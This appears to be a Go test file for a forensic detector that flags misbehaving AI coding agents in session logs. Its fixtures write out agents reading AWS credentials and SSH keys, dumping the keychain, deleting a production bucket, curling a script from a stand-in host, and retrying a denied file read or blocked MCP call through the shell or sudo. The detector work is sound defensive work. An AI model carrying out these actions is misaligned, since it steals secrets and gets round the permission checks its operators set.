package detect

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/efij/AgentDFIR/v5/internal/casepkg"
	"github.com/efij/AgentDFIR/v5/internal/catalog"
	"github.com/efij/AgentDFIR/v5/internal/rulepack"
	"github.com/efij/AgentDFIR/v5/internal/schema"
)

// p1Rules are the rule IDs this file covers.
var p1Rules = []string{"AGENT_AUTONOMOUS_RECON_SEQUENCE", "AGENT_ADAPTIVE_ATTACK_SEQUENCE",
	"AGENT_DELEGATION_SCOPE_EXPANSION", "AGENT_RESOURCE_EXHAUSTION", "AGENT_MULTIMODAL_TRIGGER_CHAIN"}

// at sets an explicit time offset (seconds after t0) on the last event.
func (b *evb) at(sec int) *evb {
	b.evs[len(b.evs)-1].Timestamp = b.t0.Add(time.Duration(sec) * time.Second).Format(time.RFC3339)
	return b
}

func (b *evb) last(f func(*schema.Event)) *evb {
	f(&b.evs[len(b.evs)-1])
	return b
}

func runP1(evs []schema.Event, id string) []schema.Finding {
	return rules(agentRulesV5P1(newEventIndex(evs), "", nil), id)
}

// ---- AGENT_AUTONOMOUS_RECON_SEQUENCE

func reconBurst() *evb {
	return newEvb().prompt("fix the failing build").
		bash("r1", "whoami").
		bash("r2", "uname -a").
		bash("r3", "env").
		bash("r4", "cat ~/.aws/credentials").
		bash("r5", "aws sts get-caller-identity").
		bash("r6", "ifconfig")
}

func TestReconPositive(t *testing.T) {
	got := runP1(reconBurst().evs, "AGENT_AUTONOMOUS_RECON_SEQUENCE")
	if len(got) != 1 {
		t.Fatalf("want one recon finding, got %+v", got)
	}
	f := got[0]
	if f.Severity != "MEDIUM" || f.Status != schema.StateObserved || f.MitreATLAS != "AML.T0116" || f.MitreATTACK != "T1082" {
		t.Fatalf("severity/state/mapping: %+v", f)
	}
	for _, k := range []string{"credential", "cloud", "environment", "network", "system"} {
		if !strings.Contains(f.Description, k) {
			t.Errorf("description lacks kind %s: %s", k, f.Description)
		}
	}
	if len(f.EvidenceRefs) != reconMaxRefs || !strings.Contains(f.FalsePositive, "legitimate") {
		t.Errorf("refs/limits: %+v", f)
	}
}

func TestReconCorroboratedEscalates(t *testing.T) {
	b := reconBurst()
	b.evs[4].Corroboration = schema.StateCorroborated // the credential read
	got := runP1(b.evs, "AGENT_AUTONOMOUS_RECON_SEQUENCE")
	if len(got) != 1 || got[0].Severity != "HIGH" || got[0].Status != schema.StateCorroborated {
		t.Fatalf("credential + corroboration: want HIGH/CORROBORATED, got %+v", got)
	}
}

func TestReconBenignTwin(t *testing.T) {
	cases := map[string]*evb{
		// The person asks between the calls: each step is instructed.
		"instructed": newEvb().prompt("who am I").bash("r1", "whoami").bash("r2", "id").
			prompt("now the network").bash("r3", "ifconfig").bash("r4", "netstat -an").
			prompt("and the cloud").bash("r5", "aws sts get-caller-identity").bash("r6", "aws s3 ls"),
		// Many calls, one kind: ordinary repository orientation never counts.
		"one kind": newEvb().prompt("look around").bash("r1", "git status").bash("r2", "ls -la").
			bash("r3", "cat README.md").bash("r4", "whoami").bash("r5", "uname -a").bash("r6", "id").bash("r7", "hostname"),
		// Spread out over hours: not one burst.
		"slow": newEvb().prompt("x").bash("r1", "whoami").at(0).bash("r2", "env").at(1200).
			bash("r3", "ifconfig").at(2400).bash("r4", "aws s3 ls").at(3600).bash("r5", "uname").at(4800).bash("r6", "netstat -an").at(6000),
		// Discovery words inside a commit message or a scratch fixture.
		"quoted": newEvb().prompt("x").bash("r1", `git commit -m "run whoami, env, ifconfig"`).
			bash("r2", "cat /tmp/fixture/.aws/credentials").bash("r3", `echo "aws s3 ls"`).
			bash("r4", "go test ./..."),
	}
	for name, b := range cases {
		if got := runP1(b.evs, "AGENT_AUTONOMOUS_RECON_SEQUENCE"); len(got) != 0 {
			t.Errorf("%s: unexpected %+v", name, got)
		}
	}
}

func TestReconMissingEvidence(t *testing.T) {
	// Tool names without commands or paths: nothing to classify.
	b := newEvb().prompt("x")
	for i := 0; i < 10; i++ {
		b.add(schema.Event{EventType: schema.EventToolCall, Tool: "Bash", ToolCallID: fmt.Sprint("c", i)})
	}
	if got := runP1(b.evs, "AGENT_AUTONOMOUS_RECON_SEQUENCE"); len(got) != 0 {
		t.Fatalf("no commands: %+v", got)
	}
	// A trace gap inside the run: the lost line may have been the prompt.
	g := newEvb().prompt("x").bash("r1", "whoami").bash("r2", "env").bash("r3", "ifconfig")
	g.add(schema.Event{EventType: schema.EventTraceGap})
	g.bash("r4", "aws s3 ls").bash("r5", "cat ~/.ssh/id_rsa").bash("r6", "uname -a")
	if got := runP1(g.evs, "AGENT_AUTONOMOUS_RECON_SEQUENCE"); len(got) != 0 {
		t.Fatalf("trace gap must end the run: %+v", got)
	}
	// No clocks at all: order alone links the run (documented), and the
	// finding is still OBSERVED, never more.
	n := reconBurst()
	for i := range n.evs {
		n.evs[i].Timestamp = ""
	}
	if got := runP1(n.evs, "AGENT_AUTONOMOUS_RECON_SEQUENCE"); len(got) != 1 || got[0].Status != schema.StateObserved {
		t.Fatalf("no timestamps: %+v", got)
	}
}

// ---- AGENT_ADAPTIVE_ATTACK_SEQUENCE

const ruleDenyText = "Permission to use Read with path /home/u/.ssh/id_rsa has been denied."

func TestAdaptivePositive(t *testing.T) {
	// Denied Read of a key, then the same file through the shell.
	b := newEvb().prompt("set up deploy").
		tool("t1", "Read", "/home/u/.ssh/id_rsa").result("t1", ruleDenyText, true).
		bash("t2", "cat /home/u/.ssh/id_rsa").result("t2", "-----BEGIN", false)
	got := runP1(b.evs, "AGENT_ADAPTIVE_ATTACK_SEQUENCE")
	if len(got) != 1 || got[0].Severity != "HIGH" || got[0].Status != schema.StateObserved || got[0].MitreATLAS != "AML.T0117" {
		t.Fatalf("want one HIGH adaptive finding, got %+v", got)
	}
	if !strings.Contains(got[0].Description, "file (/home/u/.ssh/id_rsa)") || !strings.Contains(got[0].Description, "Bash:cat instead of Read") {
		t.Errorf("description: %s", got[0].Description)
	}

	// OS refusal, then sudo: access-control error → MEDIUM even when the
	// second method completes (not a policy decision).
	b = newEvb().prompt("fix hosts").
		bash("t1", "tee -a /etc/hosts").result("t1", "tee: /etc/hosts: Permission denied", true).
		bash("t2", "sudo tee -a /etc/hosts").result("t2", "", false)
	got = runP1(b.evs, "AGENT_ADAPTIVE_ATTACK_SEQUENCE")
	if len(got) != 1 || got[0].Severity != "MEDIUM" || !strings.Contains(got[0].Description, "sudo tee") {
		t.Fatalf("sudo after EACCES: %+v", got)
	}

	// Same host, curl refused (403), then a different CLI; recorded status.
	b = newEvb().prompt("x").
		bash("t1", "curl -sf https://files.example.net/dump").result("t1", "curl: (22) The requested URL returned error: 403 Forbidden", true).
		bash("t2", "wget https://files.example.net/dump -O d").result("t2", "", false)
	if got = runP1(b.evs, "AGENT_ADAPTIVE_ATTACK_SEQUENCE"); len(got) != 1 || !strings.Contains(got[0].Description, "host (files.example.net)") {
		t.Fatalf("host target: %+v", got)
	}

	// Secret store, recorded denial via result_status (v5 field), then a
	// different operation on the same store.
	b = newEvb().prompt("x").
		bash("t1", "security find-generic-password -s prod -w").result("t1", "", true).last(func(e *schema.Event) { e.ResultStatus = "denied" }).
		bash("t2", "security dump-keychain")
	if got = runP1(b.evs, "AGENT_ADAPTIVE_ATTACK_SEQUENCE"); len(got) != 1 || !strings.Contains(got[0].Description, "secret (keychain)") || got[0].Severity != "MEDIUM" {
		t.Fatalf("secret store target: %+v", got)
	}

	// Cloud resource by recorded resource_id: MCP denied, then the CLI.
	b = newEvb().prompt("x").
		add(schema.Event{EventType: schema.EventToolCall, Tool: "mcp__aws__delete_bucket", ToolCallID: "t1", MCPServer: "aws", MCPTool: "delete_bucket", ResourceID: "arn:aws:s3:::prod-logs"}).
		result("t1", "MCP request blocked by policy", true).
		bash("t2", "aws s3api delete-bucket --bucket prod-logs && echo arn:aws:s3:::prod-logs")
	if got = runP1(b.evs, "AGENT_ADAPTIVE_ATTACK_SEQUENCE"); len(got) != 1 || !strings.Contains(got[0].Description, "cloud (arn:aws:s3:::prod-logs)") {
		t.Fatalf("cloud target: %+v", got)
	}
}

func TestAdaptiveBenignTwin(t *testing.T) {
	cases := map[string]*evb{
		// Same action again: AGENT_UNEXPECTED_AUTONOMOUS_RETRY's question.
		"retry": newEvb().bash("t1", "rm -rf /srv/data").result("t1", rejectText, true).
			bash("t2", "rm -rf /srv/data"),
		// A plain failure is not a block.
		"failure": newEvb().bash("t1", "cat /repo/config.yaml").result("t1", "cat: /repo/config.yaml: No such file or directory", true).
			tool("t2", "Read", "/repo/config.yaml"),
		// Denied write, then only reading the file: checking, not an attempt.
		"read after write": newEvb().tool("t1", "Write", "/repo/main.go").result("t1", rejectText, true).
			tool("t2", "Read", "/repo/main.go"),
		// A new instruction in between.
		"instructed": newEvb().tool("t1", "Read", "/home/u/.ssh/id_rsa").result("t1", ruleDenyText, true).
			prompt("use the shell then").bash("t2", "cat /home/u/.ssh/id_rsa"),
		// The rejection carries the person's own instruction.
		"feedback": newEvb().tool("t1", "Write", "/repo/a.go").result("t1", rejectText+" To tell you how to proceed, the user said: use Edit", true).
			tool("t2", "Edit", "/repo/a.go"),
		// Different target.
		"other target": newEvb().tool("t1", "Read", "/home/u/.ssh/id_rsa").result("t1", ruleDenyText, true).
			bash("t2", "cat /home/u/notes.txt"),
		// Loopback is never a target.
		"loopback": newEvb().bash("t1", "curl -f http://localhost:8080/x").result("t1", "403 Forbidden", true).
			bash("t2", "wget http://localhost:8080/x"),
	}
	for name, b := range cases {
		if got := runP1(b.evs, "AGENT_ADAPTIVE_ATTACK_SEQUENCE"); len(got) != 0 {
			t.Errorf("%s: unexpected %+v", name, got)
		}
	}
}

func TestAdaptiveMissingEvidence(t *testing.T) {
	cases := map[string]*evb{
		// No paired result: whether the first call was blocked is unknown.
		"no result": newEvb().tool("t1", "Read", "/home/u/.ssh/id_rsa").bash("t2", "cat /home/u/.ssh/id_rsa"),
		// Relative path and no recorded cwd: the target cannot be placed.
		"relative": newEvb().tool("t1", "Read", "secrets/key.pem").result("t1", ruleDenyText, true).
			bash("t2", "cat secrets/key.pem"),
		// Empty v5 fields everywhere and no refusal text.
		"empty": newEvb().tool("t1", "Read", "/etc/shadow").result("t1", "", false).bash("t2", "sudo cat /etc/shadow"),
	}
	for name, b := range cases {
		if got := runP1(b.evs, "AGENT_ADAPTIVE_ATTACK_SEQUENCE"); len(got) != 0 {
			t.Errorf("%s: unexpected %+v", name, got)
		}
	}
	// With a recorded cwd the relative path resolves and the pair matches.
	b := newEvb().tool("t1", "Read", "secrets/key.pem").last(func(e *schema.Event) { e.Cwd = "/repo" }).result("t1", ruleDenyText, true).
		bash("t2", "cat /repo/secrets/key.pem")
	if got := runP1(b.evs, "AGENT_ADAPTIVE_ATTACK_SEQUENCE"); len(got) != 1 {
		t.Fatalf("cwd-resolved: %+v", got)
	}
}

// ---- AGENT_RESOURCE_EXHAUSTION

func TestResourceExhaustionLoop(t *testing.T) {
	b := newEvb().prompt("watch it")
	for i := 0; i < loopMinRepeats; i++ {
		b.add(schema.Event{EventType: schema.EventToolCall, Tool: "mcp__search__query", MCPServer: "search", MCPTool: "query",
			ToolCallID: fmt.Sprint("c", i), ArgsDigest: "sha256:aaaa"}).at(i * 10)
	}
	got := runP1(b.evs, "AGENT_RESOURCE_EXHAUSTION")
	if len(got) != 1 || got[0].Severity != "MEDIUM" || got[0].MitreATLAS != "AML.T0034.002" || got[0].Status != schema.StateObserved ||
		!strings.Contains(got[0].Description, "argument digest") {
		t.Fatalf("loop by digest: %+v", got)
	}
	// Shell fallback: the exact command line is the key.
	b = newEvb()
	for i := 0; i < loopMinRepeats+5; i++ {
		b.bash(fmt.Sprint("c", i), "curl -s https://api.example.net/status").at(i * 5)
	}
	if got = runP1(b.evs, "AGENT_RESOURCE_EXHAUSTION"); len(got) != 1 || !strings.Contains(got[0].Description, "command line") {
		t.Fatalf("loop by command: %+v", got)
	}
}

func TestResourceExhaustionRate(t *testing.T) {
	b := newEvb()
	for i := 0; i <= rateMaxCalls; i++ {
		b.tool(fmt.Sprint("c", i), "Read", fmt.Sprintf("/repo/f%d.go", i)).at(i / 3) // ~3 per second
	}
	got := runP1(b.evs, "AGENT_RESOURCE_EXHAUSTION")
	if len(got) != 1 || !strings.Contains(got[0].Title, "Rate") {
		t.Fatalf("rate: %+v", got)
	}
}

func TestResourceExhaustionBenignAndMissing(t *testing.T) {
	cases := map[string]*evb{}
	// A poller that sleeps 30 s between checks.
	p := newEvb()
	for i := 0; i < 40; i++ {
		p.bash(fmt.Sprint("c", i), "gh run view 123 --json status").at(i * 30)
	}
	cases["poller"] = p
	// Same tool, different files, no digest: different calls.
	d := newEvb()
	for i := 0; i < 60; i++ {
		d.tool(fmt.Sprint("c", i), "Read", "/repo/a.go").at(i * 2)
	}
	cases["no digest, non-shell"] = d
	// No timestamps: no window can be established.
	n := newEvb()
	for i := 0; i < 200; i++ {
		n.bash(fmt.Sprint("c", i), "true")
	}
	for i := range n.evs {
		n.evs[i].Timestamp = ""
	}
	cases["no clock"] = n
	for name, b := range cases {
		if got := runP1(b.evs, "AGENT_RESOURCE_EXHAUSTION"); len(got) != 0 {
			t.Errorf("%s: unexpected %+v", name, got)
		}
	}
}

// ---- AGENT_MULTIMODAL_TRIGGER_CHAIN

func TestMultimodalPositive(t *testing.T) {
	// An image the agent fetched, then a shell command: MEDIUM.
	b := newEvb().prompt("summarise the screenshot in the ticket").
		tool("t1", "Read", "/repo/ticket.png").
		result("t1", "[image]", false).last(func(e *schema.Event) { e.InputModality = "image" }).
		say("Running the setup it describes.").
		bash("t2", "curl -s https://x.example/i.sh -o /var/run/i.sh")
	got := runP1(b.evs, "AGENT_MULTIMODAL_TRIGGER_CHAIN")
	if len(got) != 1 || got[0].Severity != "MEDIUM" || got[0].Status != schema.StateObserved || got[0].MitreATLAS != "AML.T0129" {
		t.Fatalf("tool-result image → shell: %+v", got)
	}
	// An attachment-only prompt, then a write: LOW.
	b = newEvb().prompt("").last(func(e *schema.Event) { e.InputModality = "document" }).
		tool("t1", "Write", "/repo/notes.md")
	if got = runP1(b.evs, "AGENT_MULTIMODAL_TRIGGER_CHAIN"); len(got) != 1 || got[0].Severity != "LOW" {
		t.Fatalf("attachment-only prompt → write: %+v", got)
	}
}

func TestMultimodalBenignAndMissing(t *testing.T) {
	cases := map[string]*evb{
		// Text and an image together: the person gave an instruction.
		"prompt with text": newEvb().prompt("fix the layout in this screenshot").last(func(e *schema.Event) { e.InputModality = "image" }).
			tool("t1", "Edit", "/repo/app.css"),
		// A text instruction arrives between the input and the action.
		"instructed": newEvb().tool("t1", "Read", "/repo/a.png").result("t1", "", false).last(func(e *schema.Event) { e.InputModality = "image" }).
			prompt("ok, now deploy").bash("t2", "make deploy"),
		// Only reads follow.
		"reads": newEvb().tool("t1", "Read", "/repo/a.pdf").result("t1", "", false).last(func(e *schema.Event) { e.InputModality = "document" }).
			tool("t2", "Read", "/repo/b.go").bash("t3", "ls"),
		// No recorded modality (parser did not fill it): nothing.
		"missing modality": newEvb().tool("t1", "Read", "/repo/a.png").result("t1", "[image]", false).bash("t2", "make deploy"),
		// Unknown modality values are not guessed at.
		"unknown modality": newEvb().tool("t1", "Read", "/repo/a").result("t1", "", false).last(func(e *schema.Event) { e.InputModality = "text" }).
			bash("t2", "make deploy"),
	}
	for name, b := range cases {
		if got := runP1(b.evs, "AGENT_MULTIMODAL_TRIGGER_CHAIN"); len(got) != 0 {
			t.Errorf("%s: unexpected %+v", name, got)
		}
	}
}

// ---- AGENT_DELEGATION_SCOPE_EXPANSION

// delegated builds a parent session that spawns subagent "agent-x" as
// typ, with the subagent's events produced by sub.
func delegated(typ string, linkByParentID bool, sub func(b *evb)) *evb {
	b := newEvb().prompt("review the repo")
	b.add(schema.Event{EventType: schema.EventToolCall, Tool: "Task", ToolCallID: "spawn1", Action: "spawn_subagent", Cwd: "/repo",
		SafeArgs: map[string]string{"subagent_type": typ}})
	if !linkByParentID {
		b.add(schema.Event{EventType: schema.EventAgentSpawn, ToolCallID: "spawn1", TaskID: "agent-x"})
	}
	start := len(b.evs)
	b.add(schema.Event{EventType: schema.EventAgentMessage, AgentID: "agent-x", Summary: "review the repo"})
	sub(b)
	for i := start; i < len(b.evs); i++ {
		b.evs[i].AgentID = "agent-x"
		b.evs[i].SourcePath = ".claude/projects/-repo/s1/subagents/agent-x.jsonl"
		b.evs[i].SourceArtifact = "art2"
		if linkByParentID {
			b.evs[i].ParentToolCallID = "spawn1"
		}
	}
	return b
}

func reviewerDef() agentDef {
	return agentDef{name: "reviewer", declared: true, tools: []string{"Read", "Grep", "Bash(git diff:*)"},
		art: casepkg.ArtifactRecord{LogicalPath: ".claude/agents/reviewer.md", ArtifactID: "def1"}, profile: ".claude",
		mtime: time.Date(2026, 8, 1, 0, 0, 0, 0, time.UTC), hasTime: true}
}

func TestDelegationToolsPositive(t *testing.T) {
	for _, byParent := range []bool{true, false} {
		b := delegated("reviewer", byParent, func(b *evb) {
			b.tool("s1", "Read", "/repo/a.go").
				tool("s2", "Write", "/repo/a.go").result("s2", "", false).
				add(schema.Event{EventType: schema.EventToolCall, Tool: "mcp__slack__post", ToolCallID: "s3", MCPServer: "slack", MCPTool: "post"})
		})
		got := rules(delegationScope(newEventIndex(b.evs), []agentDef{reviewerDef()}, nil), "AGENT_DELEGATION_SCOPE_EXPANSION")
		if len(got) != 1 {
			t.Fatalf("byParent=%v: want one finding, got %+v", byParent, got)
		}
		f := got[0]
		if f.Severity != "HIGH" || f.Confidence != "MEDIUM" || f.AgentID != "agent-x" || f.ParentAgentID != "main:s1" ||
			f.Status != schema.StateObserved || !strings.Contains(f.Description, "Write, mcp__slack__post") {
			t.Fatalf("byParent=%v: %+v", byParent, f)
		}
	}
}

func TestDelegationPathScope(t *testing.T) {
	b := delegated("general-purpose", true, func(b *evb) {
		b.tool("s1", "Edit", "/repo/a.go").
			tool("s2", "Write", "/etc/cron.d/job").result("s2", "", false).
			bash("s3", "echo x > /tmp/scratch.txt").
			bash("s4", "cp a /home/u/other-project/a")
	})
	got := rules(delegationScope(newEventIndex(b.evs), nil, nil), "AGENT_DELEGATION_SCOPE_EXPANSION")
	if len(got) != 1 || got[0].Severity != "MEDIUM" || !strings.Contains(got[0].Description, "/etc/cron.d/job, /home/u/other-project/a") {
		t.Fatalf("out-of-cwd writes: %+v", got)
	}
	// An additional directory from the same profile's settings widens scope.
	dirs := []extraDir{{dir: "/home/u/other-project", profile: ".claude"}, {dir: "/etc", profile: ".claude"}}
	if got = rules(delegationScope(newEventIndex(b.evs), nil, dirs), "AGENT_DELEGATION_SCOPE_EXPANSION"); len(got) != 0 {
		t.Fatalf("additional directories: %+v", got)
	}
}

func TestDelegationBenignAndMissing(t *testing.T) {
	inList := delegated("reviewer", true, func(b *evb) {
		b.tool("s1", "Read", "/repo/a.go").bash("s2", "git diff HEAD~1").tool("s3", "Grep", "")
	})
	noTools := reviewerDef()
	noTools.declared, noTools.tools = false, nil
	otherProfile := reviewerDef()
	otherProfile.profile = ".claude-work"
	outside := delegated("reviewer", true, func(b *evb) { b.tool("s1", "Write", "/repo/a.go") })
	untyped := delegated("", true, func(b *evb) { b.tool("s1", "Write", "/repo/a.go") })
	cases := []struct {
		name string
		b    *evb
		defs []agentDef
	}{
		{"tools in list", inList, []agentDef{reviewerDef()}},
		{"definition declares no tools (inherits all)", outside, []agentDef{noTools}},
		{"definition not collected", outside, nil},
		{"definition of another profile", outside, []agentDef{otherProfile}},
		{"no recorded subagent type", untyped, []agentDef{reviewerDef()}},
	}
	for _, c := range cases {
		if got := rules(delegationScope(newEventIndex(c.b.evs), c.defs, nil), "AGENT_DELEGATION_SCOPE_EXPANSION"); len(got) != 0 {
			t.Errorf("%s: unexpected %+v", c.name, got)
		}
	}
	// No link to a spawn call at all (an orphan): nothing compared.
	o := newEvb().add(schema.Event{EventType: schema.EventToolCall, AgentID: "agent-y", Tool: "Write", File: "/etc/passwd"})
	if got := rules(delegationScope(newEventIndex(o.evs), []agentDef{reviewerDef()}, nil), "AGENT_DELEGATION_SCOPE_EXPANSION"); len(got) != 0 {
		t.Errorf("orphan: %+v", got)
	}
	// Definition modified after the call: confidence drops to LOW.
	late := reviewerDef()
	late.mtime = time.Date(2027, 1, 1, 0, 0, 0, 0, time.UTC)
	if got := rules(delegationScope(newEventIndex(outside.evs), []agentDef{late}, nil), "AGENT_DELEGATION_SCOPE_EXPANSION"); len(got) != 1 || got[0].Confidence != "LOW" {
		t.Errorf("late definition: %+v", got)
	}
}

func TestParseAgentDef(t *testing.T) {
	cases := []struct {
		src      string
		ok       bool
		declared bool
		tools    []string
		name     string
	}{
		{"---\nname: reviewer\ntools: Read, Grep, Bash(git diff:*, git log:*)\n---\nbody", true, true, []string{"Read", "Grep", "Bash(git diff:*, git log:*)"}, "reviewer"},
		{"---\ntools: [\"Read\", 'Edit']\n---\n", true, true, []string{"Read", "Edit"}, "fb"},
		{"---\ntools:\n  - Read\n- mcp__github\nmodel: x\n---\n", true, true, []string{"Read", "mcp__github"}, "fb"},
		{"---\nname: x\nmodel: sonnet\n---\n", true, false, nil, "x"},
		{"---\ntools:\nmodel: x\n---\n", true, false, nil, "fb"},
		{"no front matter", false, false, nil, "fb"},
		{"---\nname: unterminated\ntools: Read\n", false, false, nil, "fb"},
		{"\xef\xbb\xbf---\r\nname: bom\r\ntools: Read\r\n---\r\n", true, true, []string{"Read"}, "bom"},
	}
	for _, c := range cases {
		d, ok := parseAgentDef([]byte(c.src), "fb")
		if ok != c.ok || d.declared != c.declared || d.name != c.name || (c.tools != nil && !reflect.DeepEqual(d.tools, c.tools)) {
			t.Errorf("%q: got ok=%v declared=%v name=%q tools=%q", c.src, ok, d.declared, d.name, d.tools)
		}
	}
	if !toolListed([]string{"mcp__github"}, "mcp__github__create_issue") || toolListed([]string{"mcp__github"}, "mcp__githubx__a") ||
		!toolListed([]string{"Task"}, "Agent") || !toolListed([]string{"Bash(git:*)"}, "Bash") || toolListed([]string{"Read"}, "Write") {
		t.Error("toolListed")
	}
}

func TestLoadAgentDefsAndDirsFromPackage(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "raw"), 0o755); err != nil {
		t.Fatal(err)
	}
	write := func(id, body string) {
		if err := os.WriteFile(filepath.Join(dir, "raw", id), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("def1", "---\nname: reviewer\ntools: Read\n---\n")
	write("def2", "---\ntools: Bash\n---\n")
	write("def3", "garbage")
	settings, _ := json.Marshal(map[string]any{"permissions": map[string]any{"additionalDirectories": []string{"/srv/shared", "~/rel", "relative"}}})
	write("set1", string(settings))
	man := &casepkg.Manifest{}
	ok := casepkg.StatusOK
	man.Artifacts = []casepkg.ArtifactRecord{
		{ArtifactID: "def1", LogicalPath: ".claude/agents/reviewer.md", CollectorRule: "claude.agents", Status: ok, Size: 40},
		{ArtifactID: "def2", LogicalPath: ".claude/plugins/cache/mkt/toolkit/1.2.0/agents/builder.md", CollectorRule: "claude.plugins", Status: ok, Size: 20},
		{ArtifactID: "def3", LogicalPath: ".claude/agents/bad.md", CollectorRule: "claude.agents", Status: ok, Size: 7},
		{ArtifactID: "set1", LogicalPath: ".claude/settings.json", CollectorRule: "claude.settings", Status: ok, Size: int64(len(settings))},
	}
	store := casepkg.NewStore(dir, man)
	defs := loadAgentDefs(store, man)
	if len(defs) != 2 || defs[0].name != "reviewer" || defs[1].name != "builder" || defs[1].plugin != "toolkit" || defs[0].profile != ".claude" {
		t.Fatalf("defs: %+v", defs)
	}
	if d, ok := findDef(defs, "toolkit:builder", schema.Event{SourcePath: ".claude/projects/x.jsonl"}); !ok || d.art.ArtifactID != "def2" {
		t.Fatalf("plugin agent lookup: %+v %v", d, ok)
	}
	dirs := loadExtraDirs(store, man)
	if len(dirs) != 1 || dirs[0].dir != "/srv/shared" {
		t.Fatalf("dirs: %+v", dirs)
	}
}

// ---- shared gates

// TestP1Hostile: garbage everywhere, no panic, no invented finding.
func TestP1Hostile(t *testing.T) {
	b := newEvb()
	b.add(schema.Event{EventType: schema.EventToolResult, Summary: rejectText, InputModality: "image"})
	b.add(schema.Event{EventType: schema.EventToolCall, Tool: "Bash", Command: strings.Repeat("cat /etc/passwd; ", 4000)})
	b.add(schema.Event{EventType: schema.EventToolCall, Timestamp: "not-a-time", Tool: "Task", ToolCallID: "x", SafeArgs: map[string]string{"subagent_type": ":"}})
	b.add(schema.Event{EventType: schema.EventAgentSpawn, ToolCallID: "x", TaskID: "main:s1"}) // claims to spawn its own caller
	b.add(schema.Event{EventType: schema.EventToolCall, Tool: "Read", File: "\x00/../../..", ParentToolCallID: "x", AgentID: "a2", Cwd: "relative"})
	b.add(schema.Event{EventType: schema.EventToolCall, Tool: "Bash", Command: "sudo", ResultStatus: "denied"})
	b.add(schema.Event{EventType: schema.EventToolCall, Tool: "Bash", Command: "> >> | ; && ||"})
	_ = agentRulesV5P1(newEventIndex(b.evs), "", nil)
	_ = agentRulesV5P1(newEventIndex(nil), "", nil)
	_ = agentRulesV5P1(newEventIndex(b.evs), "/nonexistent", &casepkg.Manifest{})
	for _, s := range []string{"", "---", "---\n---", "---\ntools: [,,,(((]\n---", "---\n" + strings.Repeat("- x\n", 10000) + "---", "---\ntools: " + strings.Repeat("(", 5000) + "\n---"} {
		_, _ = parseAgentDef([]byte(s), "x")
	}
	_ = targetsOf(schema.Event{Command: strings.Repeat("arn:aws:s3:::b ", 1000) + strings.Repeat(" s3://b", 1000)})
	_ = methodOf(schema.Event{Command: "sudo sudo sudo"}, target{"file", "/x"})
	if got := runP1(b.evs, "AGENT_AUTONOMOUS_RECON_SEQUENCE"); len(got) != 0 {
		t.Errorf("hostile recon: %+v", got)
	}
}

// TestP1Deterministic: the same events give byte-identical findings, and
// the order of independent agents in the input does not change them.
func TestP1Deterministic(t *testing.T) {
	build := func() []schema.Event {
		var evs []schema.Event
		evs = append(evs, reconBurst().evs...)
		a := newEvb().tool("t1", "Read", "/home/u/.ssh/id_rsa").result("t1", ruleDenyText, true).bash("t2", "cat /home/u/.ssh/id_rsa")
		for _, e := range a.evs {
			e.AgentID, e.SessionID, e.EventID = "main:s2", "s2", "s2-"+e.EventID
			evs = append(evs, e)
		}
		return evs
	}
	enc := func(evs []schema.Event) string {
		data, _ := json.Marshal(RunAgentRules(evs, "", nil))
		return string(data)
	}
	first := enc(build())
	for i := 0; i < 5; i++ {
		if got := enc(build()); got != first {
			t.Fatalf("run %d differs", i)
		}
	}
	rev := build()
	for i, j := 0, len(rev)-1; i < j; i, j = i+1, j-1 {
		rev[i], rev[j] = rev[j], rev[i]
	}
	if got := enc(rev); got != first {
		t.Fatalf("input order changed the findings:\n%s\n%s", got, first)
	}
	if !strings.Contains(first, "AGENT_AUTONOMOUS_RECON_SEQUENCE") || !strings.Contains(first, "AGENT_ADAPTIVE_ATTACK_SEQUENCE") {
		t.Fatalf("expected both rules in %s", first)
	}
}

// TestP1Mappings: every rule here is in the catalog with an ATLAS ID valid
// in the pinned table, an active (not revoked) ATT&CK v20.0 technique, and
// limits text in the code's false-positive notes.
func TestP1Mappings(t *testing.T) {
	// Checked against ATT&CK Enterprise v20.0: all active, none revoked.
	activeV20 := map[string]bool{"T1082": true, "T1548": true, "T1496": true, "T1027": true}
	for _, id := range p1Rules {
		r, ok := catalog.ByID(id)
		if !ok {
			t.Errorf("%s: not in catalog", id)
			continue
		}
		if !rulepack.ValidATLAS(r.MitreATLAS) {
			t.Errorf("%s: ATLAS %q not valid", id, r.MitreATLAS)
		}
		if !activeV20[r.MitreATTACK] {
			t.Errorf("%s: ATT&CK %q not in the checked active v20.0 set", id, r.MitreATTACK)
		}
	}
	src, err := os.ReadFile("agent_v5_p1.go")
	if err != nil {
		t.Fatal(err)
	}
	for _, limit := range []string{"can be legitimate", "is not causation", "is not proof", "not the same as unauthorized"} {
		if !strings.Contains(string(src), limit) {
			t.Errorf("limits text %q missing from the rule notes", limit)
		}
	}
}
